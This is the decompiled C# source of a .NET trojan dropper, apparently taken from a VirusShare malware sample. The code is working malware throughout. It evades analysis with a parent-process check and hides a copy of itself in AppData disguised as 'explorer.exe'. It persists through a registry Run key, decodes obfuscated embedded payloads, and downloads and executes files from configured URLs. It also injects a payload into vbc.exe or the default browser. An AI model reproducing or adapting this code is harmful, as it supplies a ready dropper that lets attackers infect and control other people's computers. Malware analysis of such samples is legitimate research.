// Decompiled with JetBrains decompiler
// Type: loader.Program
// Assembly: lol, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9A1BC64A-7900-4379-A5BE-D9BED596C335
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Dropper.MSIL.StubRC.ila-e1fc7badd28906c560c473647ab572bfc4d31a6e029950d331098fef337e3a47.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;

namespace loader
{
  internal class Program
  {
    private static string[] x = new string[1]
    {
      "@@xSilent@@"
    };

    private static void Main(string[] args) => Program.hpwnspgh();

    private static void twtajtnm(object bytes)
    {
      Assembly assembly = Assembly.Load((byte[]) bytes);
      MethodInfo entryPoint = assembly.EntryPoint;
      if ((object) entryPoint == null)
        return;
      if (entryPoint.GetParameters().Length > 0)
      {
        object instance = assembly.CreateInstance(entryPoint.Name);
        entryPoint.Invoke(instance, (object[]) new string[1]);
      }
      else
      {
        object instance = assembly.CreateInstance(entryPoint.Name);
        entryPoint.Invoke(instance, (object[]) null);
      }
    }

    private static string xipnqzhs()
    {
      string str = string.Empty;
      RegistryKey registryKey = (RegistryKey) null;
      try
      {
        registryKey = Registry.ClassesRoot.OpenSubKey("HTTP\\shell\\open\\command", false);
        str = registryKey.GetValue((string) null).ToString().ToLower().Replace("\"", "");
        if (!str.EndsWith("exe"))
          str = str.Substring(0, str.LastIndexOf(".exe") + 4);
      }
      finally
      {
        registryKey?.Close();
      }
      return str;
    }

    public static bool dvguryeh()
    {
      try
      {
        return !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ProgramW6432"));
      }
      catch
      {
        return false;
      }
    }

    public static bool CheckParentProcess()
    {
      using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
      {
        managementObject.Get();
        return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
      }
    }

    private static bool qcdgicmm(byte[] pe)
    {
      try
      {
        Assembly.Load(pe);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static void hpwnspgh()
    {
      ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
      if ((bool) resourceManager.GetObject("Anti") && !Program.CheckParentProcess())
        Process.GetCurrentProcess().Kill();
      bool flag1 = (bool) resourceManager.GetObject("Startup");
      bool flag2 = (bool) resourceManager.GetObject("Run\\DL");
      if (Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
      {
        if (flag1)
        {
          try
          {
            Random random = new Random();
            string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string name = random.Next(0, 1000).ToString() + "explorer.exe";
            System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, str + name, true);
            System.IO.File.SetAttributes(str + name, FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
            Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(name, (object) (str + name));
          }
          catch
          {
          }
        }
      }
      byte[] bytes = Encoding.GetEncoding(1252).GetBytes(Program.ccphnsrj(resourceManager.GetString("File"), 1));
      bool flag3 = Program.qcdgicmm(bytes);
      Assembly kimhthhg = fvqunanz.qcsnjkrw(resourceManager.GetString("rPe"));
      string parameter1 = resourceManager.GetString("Bound");
      if (Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) || flag2)
      {
        if (!string.IsNullOrEmpty(parameter1))
          new Thread(new ParameterizedThreadStart(Program.tvihlcsv)).Start((object) parameter1);
        string parameter2 = resourceManager.GetString("Urls");
        if (!string.IsNullOrEmpty(parameter2))
          new Thread(new ParameterizedThreadStart(Program.svnoqion)).Start((object) parameter2);
      }
      string str1 = resourceManager.GetString("InjecType");
      string str2;
      switch (str1)
      {
        case "Auto":
          str2 = Program.dvguryeh() ? Environment.SystemDirectory[0].ToString() + ":\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe" : Program.xipnqzhs();
          break;
        case "Browser":
          str2 = Program.xipnqzhs();
          break;
        default:
          str2 = str1;
          break;
      }
      if (!flag3)
        Program.kpmahcox("rPe", "Run", kimhthhg, new object[2]
        {
          (object) bytes,
          (object) str2
        });
      else
        new Thread(new ParameterizedThreadStart(Program.twtajtnm)).Start((object) bytes);
    }

    public static string ccphnsrj(string textToEncrypt, int key)
    {
      StringBuilder stringBuilder1 = new StringBuilder(textToEncrypt);
      StringBuilder stringBuilder2 = new StringBuilder(textToEncrypt.Length);
      for (int index = 0; index < textToEncrypt.Length; ++index)
      {
        char ch = (char) ((uint) stringBuilder1[index] ^ (uint) key);
        stringBuilder2.Append(ch);
      }
      return stringBuilder2.ToString();
    }

    private static bool kpmahcox(
      string ccaaljma,
      string bcfhrqis,
      Assembly kimhthhg,
      object[] njctitpw)
    {
      try
      {
        Type type = kimhthhg.GetType(ccaaljma);
        if ((object) type != null)
        {
          MethodInfo method = type.GetMethod(bcfhrqis);
          if ((object) method != null)
            return (bool) method.Invoke((object) null, njctitpw);
        }
      }
      catch (Exception ex)
      {
        return false;
      }
      return false;
    }

    private static void svnoqion(object urlArray)
    {
      WebClient webClient = new WebClient();
      Random random = new Random();
      foreach (string address in ((string) urlArray).Split(Program.x, StringSplitOptions.RemoveEmptyEntries))
      {
        try
        {
          string str = address.Substring(address.LastIndexOf("/") + 1);
          string fileName = Path.GetTempFileName().Replace(".tmp", random.Next(0, 1000).ToString() + str);
          webClient.DownloadFile(address, fileName);
          Process.Start(fileName);
        }
        catch
        {
        }
      }
    }

    private static void tvihlcsv(object boundArray)
    {
      Random random = new Random();
      foreach (string str1 in ((string) boundArray).Split(Program.x, StringSplitOptions.RemoveEmptyEntries))
      {
        try
        {
          string[] strArray = str1.Split(new string[1]
          {
            "@@ext@@"
          }, StringSplitOptions.RemoveEmptyEntries);
          byte[] bytes = Encoding.GetEncoding(1252).GetBytes(Program.qusvwpkf(strArray[0]));
          string str2 = Path.GetTempPath() + (object) random.Next(0, 1000) + strArray[1];
          System.IO.File.WriteAllBytes(str2, bytes);
          Process.Start(str2);
        }
        catch
        {
        }
      }
    }

    public static string qusvwpkf(string s)
    {
      char[] charArray = s.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }
  }
}
